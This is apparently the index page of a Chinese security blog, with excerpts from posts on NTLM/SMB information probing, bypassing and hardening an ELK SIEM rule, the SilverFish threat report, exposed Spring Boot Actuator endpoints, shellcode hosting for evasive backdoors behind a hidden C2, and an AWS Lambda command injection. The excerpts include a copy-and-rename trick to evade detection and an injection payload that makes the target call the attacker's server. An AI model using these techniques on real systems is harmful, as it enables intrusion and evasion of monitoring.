<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>😊#</title>
  <meta name="author" content="JKme">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="😊#"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/favicon.png" rel="icon">
  
  

  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
  <script src="/js/jquery-2.0.3.min.js"></script>
<!--   <script src="/js/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
</head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">😊#</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/project" title="All the categories.">
			  <i class=""></i>Projects
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class="fa fa-rss"></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>😊#<span class="blink-fast">|</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		wubba lubba dub dub.

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/06/windows-ntlm-smb-scan.html" >NTLM端口信息探测</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。</p>
<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的</p>
<h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：</p>
<pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)
Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)
Security Blob: 可变长度，取决于Security Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的数据包结构的关键数据是<code>Security Blob Length</code>和<code>Byte Content</code>，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：</p>
<h6 id="GSS-API的长度是271-Byte"><a href="#GSS-API的长度是271-Byte" class="headerlink" title="GSS-API的长度是271 Byte"></a>GSS-API的长度是271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p>
<h6 id="Native-OS的长度是42-Byte"><a href="#Native-OS的长度是42-Byte" class="headerlink" title="Native OS的长度是42 Byte"></a>Native OS的长度是42 Byte</h6>
	

	</div>
  <a type="button" href="/2021/08/06/windows-ntlm-smb-scan.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。</p>
<h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的</p>
<h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>使用<a target="_blank" rel="noopener" href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：</p>
<pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byte
Word Count:  1 byte
AndXCommand: 1 byte
Reserved:    1 byte
AndXOffset:  2 byte
Action: 	   2 byte
Security Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)
Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)
Security Blob: 可变长度，取决于Security Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面的数据包结构的关键数据是<code>Security Blob Length</code>和<code>Byte Content</code>，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：</p>
<h6 id="GSS-API的长度是271-Byte"><a href="#GSS-API的长度是271-Byte" class="headerlink" title="GSS-API的长度是271 Byte"></a>GSS-API的长度是271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p>
<h6 id="Native-OS的长度是42-Byte"><a href="#Native-OS的长度是42-Byte" class="headerlink" title="Native OS的长度是42 Byte"></a>Native OS的长度是42 Byte</h6>
	
	</div>
  <a type="button" href="/2021/08/06/windows-ntlm-smb-scan.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/08/02/siem-on-elk.html" >SIEM On ELK</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-08-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>参考链接里有详细的安装步骤，测试客户端是Windows，安装了如下软件：</p>
<ul>
<li>sysmon.exe(<a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config">配置文件</a>)<ul>
<li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li>
</ul>
</li>
<li>winlogbeat.exe<ul>
<li><code>.\install-service-winlogbeat.ps1</code></li>
<li><code>.\winlogbeat.exe setup -e</code></li>
</ul>
</li>
<li>ElasticAgent.exe<ul>
<li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="规则监测和绕过"><a href="#规则监测和绕过" class="headerlink" title="规则监测和绕过"></a>规则监测和绕过</h3><p>规则有5种查询，一般使用EQL(Event Query Language)查询类型:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEM有内置很多规则，默认是关闭状态，这些规则都是ATT&amp;CK框架攻击行为转化而来的，例如windows下的<code>whoami</code>查询规则(<del>正经人谁查whoami啊</del>):</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们拿这条规则做分析，这条规则匹配了当进程开始的时候，进程名为<code>whoami.exe</code>的时候触发，所以我们把<code>whoami.exe</code>复制一下，就可以绕过去了:</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>是不是把siem想的简单了，这跟通过复制<code>net.exe</code>绕过添加用户一模一样，仔细观察下elk里面的字段，可以发现<code>process.pe.original_file_name</code>仍然保留了<code>whoami.exe</code>，这是PE文件里面固定的，所以我们手动把预警规则修改一下:</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2021/08/02/siem-on-elk.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>参考链接里有详细的安装步骤，测试客户端是Windows，安装了如下软件：</p>
<ul>
<li>sysmon.exe(<a target="_blank" rel="noopener" href="https://github.com/SwiftOnSecurity/sysmon-config">配置文件</a>)<ul>
<li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li>
</ul>
</li>
<li>winlogbeat.exe<ul>
<li><code>.\install-service-winlogbeat.ps1</code></li>
<li><code>.\winlogbeat.exe setup -e</code></li>
</ul>
</li>
<li>ElasticAgent.exe<ul>
<li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="规则监测和绕过"><a href="#规则监测和绕过" class="headerlink" title="规则监测和绕过"></a>规则监测和绕过</h3><p>规则有5种查询，一般使用EQL(Event Query Language)查询类型:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEM有内置很多规则，默认是关闭状态，这些规则都是ATT&amp;CK框架攻击行为转化而来的，例如windows下的<code>whoami</code>查询规则(<del>正经人谁查whoami啊</del>):</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们拿这条规则做分析，这条规则匹配了当进程开始的时候，进程名为<code>whoami.exe</code>的时候触发，所以我们把<code>whoami.exe</code>复制一下，就可以绕过去了:</p>
<pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>是不是把siem想的简单了，这跟通过复制<code>net.exe</code>绕过添加用户一模一样，仔细观察下elk里面的字段，可以发现<code>process.pe.original_file_name</code>仍然保留了<code>whoami.exe</code>，这是PE文件里面固定的，所以我们手动把预警规则修改一下:</p>
<pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2021/08/02/siem-on-elk.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/07/29/silverFish.html" >Silver调查报告</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-07-29  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p>
</blockquote>
<h1 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h1><p>根据FireEye发布的IOC，有一个域名是databasegalore.com，这个域名下的IP在2304端口起了PowerMTA服务，web目录扫描之后发现example.php。PTI团队根据这两个网页的设备指纹和PowerMTA服务，扫描了全网的IPv4地址，发现一个IP地址: <code>81.4.122.203</code>，然后PTI团队对IP下的C段进行渗透测试，发现<code>81.4.122.101</code>存在一个C2服务器。</p>
<h3 id="C2分析"><a href="#C2分析" class="headerlink" title="C2分析"></a>C2分析</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p>
<p>收集信息如下：</p>
<ul>
<li>ID</li>
<li>UUID</li>
<li>Instance</li>
<li>IP</li>
<li>Country</li>
<li>Domain\User@Computer</li>
<li>OS</li>
<li>Build</li>
<li>Architecture</li>
<li>Antivirus</li>
<li>Is Admin</li>
<li>Integrity Level</li>
<li>UAC Setting</li>
<li>ConsentPromptBehaviorAdmin • PromptOnSecureDesktop</li>
<li>First visit</li>
</ul>
<p>每个受害者页面都可以发送攻击指令，有如下：<br><img src="/2021/07/29/silverFish/silver_command.png"></p>
<p>看了下是命令执行和UAC绕过比较多，C2服务器的防护措施有如下：</p>
<ul>
<li>使用AppArmor隔离环境</li>
<li>关闭访问日志（web日志、SSH登录日志、命令行日志）</li>
<li>使用IPTABLES只允许白名单IP访问</li>
</ul>
	

	</div>
  <a type="button" href="/2021/07/29/silverFish.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p>
</blockquote>
<h1 id="起点"><a href="#起点" class="headerlink" title="起点"></a>起点</h1><p>根据FireEye发布的IOC，有一个域名是databasegalore.com，这个域名下的IP在2304端口起了PowerMTA服务，web目录扫描之后发现example.php。PTI团队根据这两个网页的设备指纹和PowerMTA服务，扫描了全网的IPv4地址，发现一个IP地址: <code>81.4.122.203</code>，然后PTI团队对IP下的C段进行渗透测试，发现<code>81.4.122.101</code>存在一个C2服务器。</p>
<h3 id="C2分析"><a href="#C2分析" class="headerlink" title="C2分析"></a>C2分析</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p>
<p>收集信息如下：</p>
<ul>
<li>ID</li>
<li>UUID</li>
<li>Instance</li>
<li>IP</li>
<li>Country</li>
<li>Domain\User@Computer</li>
<li>OS</li>
<li>Build</li>
<li>Architecture</li>
<li>Antivirus</li>
<li>Is Admin</li>
<li>Integrity Level</li>
<li>UAC Setting</li>
<li>ConsentPromptBehaviorAdmin • PromptOnSecureDesktop</li>
<li>First visit</li>
</ul>
<p>每个受害者页面都可以发送攻击指令，有如下：<br><img src="/2021/07/29/silverFish/silver_command.png"></p>
<p>看了下是命令执行和UAC绕过比较多，C2服务器的防护措施有如下：</p>
<ul>
<li>使用AppArmor隔离环境</li>
<li>关闭访问日志（web日志、SSH登录日志、命令行日志）</li>
<li>使用IPTABLES只允许白名单IP访问</li>
</ul>
	
	</div>
  <a type="button" href="/2021/07/29/silverFish.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/05/27/spring-boot-actuator.html" >Spring Boot Actuator漏洞复现</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-05-27  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
<li>在pom.xml里面有这样的配置</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">
&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>没有开启安全设置</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &#39;*&#39;
      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
<p>  搜索github的源代码，可以看到类似的设置：</p>
<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
&#x2F;auditevents
&#x2F;autoconfig
&#x2F;beans
&#x2F;caches
&#x2F;conditions
&#x2F;configprops
&#x2F;docs
&#x2F;dump
&#x2F;env
&#x2F;flyway
&#x2F;health
&#x2F;heapdump
&#x2F;httptrace
&#x2F;info
&#x2F;intergrationgraph
&#x2F;jolokia
&#x2F;logfile
&#x2F;loggers
&#x2F;liquibase
&#x2F;metrics
&#x2F;mappings
&#x2F;prometheus
&#x2F;refresh
&#x2F;scheduledtasks
&#x2F;sessions
&#x2F;shutdown
&#x2F;trace
&#x2F;threaddump
&#x2F;actuator&#x2F;auditevents
&#x2F;actuator&#x2F;beans
&#x2F;actuator&#x2F;health
&#x2F;actuator&#x2F;conditions
&#x2F;actuator&#x2F;configprops
&#x2F;actuator&#x2F;env
&#x2F;actuator&#x2F;info
&#x2F;actuator&#x2F;loggers
&#x2F;actuator&#x2F;heapdump
&#x2F;actuator&#x2F;threaddump
&#x2F;actuator&#x2F;metrics
&#x2F;actuator&#x2F;scheduledtasks
&#x2F;actuator&#x2F;httptrace
&#x2F;actuator&#x2F;mappings
&#x2F;actuator&#x2F;jolokia
&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
<li>在pom.xml里面有这样的配置</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">
&lt;dependency&gt;
   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ol start="2">
<li>没有开启安全设置</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &#39;*&#39;
      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
<p>  搜索github的源代码，可以看到类似的设置：</p>
<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
&#x2F;auditevents
&#x2F;autoconfig
&#x2F;beans
&#x2F;caches
&#x2F;conditions
&#x2F;configprops
&#x2F;docs
&#x2F;dump
&#x2F;env
&#x2F;flyway
&#x2F;health
&#x2F;heapdump
&#x2F;httptrace
&#x2F;info
&#x2F;intergrationgraph
&#x2F;jolokia
&#x2F;logfile
&#x2F;loggers
&#x2F;liquibase
&#x2F;metrics
&#x2F;mappings
&#x2F;prometheus
&#x2F;refresh
&#x2F;scheduledtasks
&#x2F;sessions
&#x2F;shutdown
&#x2F;trace
&#x2F;threaddump
&#x2F;actuator&#x2F;auditevents
&#x2F;actuator&#x2F;beans
&#x2F;actuator&#x2F;health
&#x2F;actuator&#x2F;conditions
&#x2F;actuator&#x2F;configprops
&#x2F;actuator&#x2F;env
&#x2F;actuator&#x2F;info
&#x2F;actuator&#x2F;loggers
&#x2F;actuator&#x2F;heapdump
&#x2F;actuator&#x2F;threaddump
&#x2F;actuator&#x2F;metrics
&#x2F;actuator&#x2F;scheduledtasks
&#x2F;actuator&#x2F;httptrace
&#x2F;actuator&#x2F;mappings
&#x2F;actuator&#x2F;jolokia
&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/06/defense-from-c2.html" >防御性C2玩具尝试</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-06  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
<li>后门被静态分析</li>
<li>后门被动态分析</li>
<li>shellcode被提取之后触发</li>
<li>…</li>
</ul>
<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
<ol>
<li>不带合理参数请求shellcode的URL时候，发起警告</li>
<li>当木马运行在恶意环境的时候，发起警告<ul>
<li>当木马上线IP不在服务端列表</li>
<li>当木马上线主机的设备指纹不在服务端列表</li>
</ul>
</li>
<li>shellcode托管服务随时可以关闭打开</li>
<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
</ol>
<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
<li>一台VPS：托管shellcode，通知slack机器人</li>
<li>一个AWS账号隐藏C2（CloudFront）</li>
<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
</ul>
<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
	

	</div>
  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
<li>后门被静态分析</li>
<li>后门被动态分析</li>
<li>shellcode被提取之后触发</li>
<li>…</li>
</ul>
<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
<ol>
<li>不带合理参数请求shellcode的URL时候，发起警告</li>
<li>当木马运行在恶意环境的时候，发起警告<ul>
<li>当木马上线IP不在服务端列表</li>
<li>当木马上线主机的设备指纹不在服务端列表</li>
</ul>
</li>
<li>shellcode托管服务随时可以关闭打开</li>
<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
</ol>
<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
<li>一台VPS：托管shellcode，通知slack机器人</li>
<li>一个AWS账号隐藏C2（CloudFront）</li>
<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
</ul>
<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
	
	</div>
  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/01/aws-lambda-rce.html" >Lambda远程命令执行测试</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-01  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
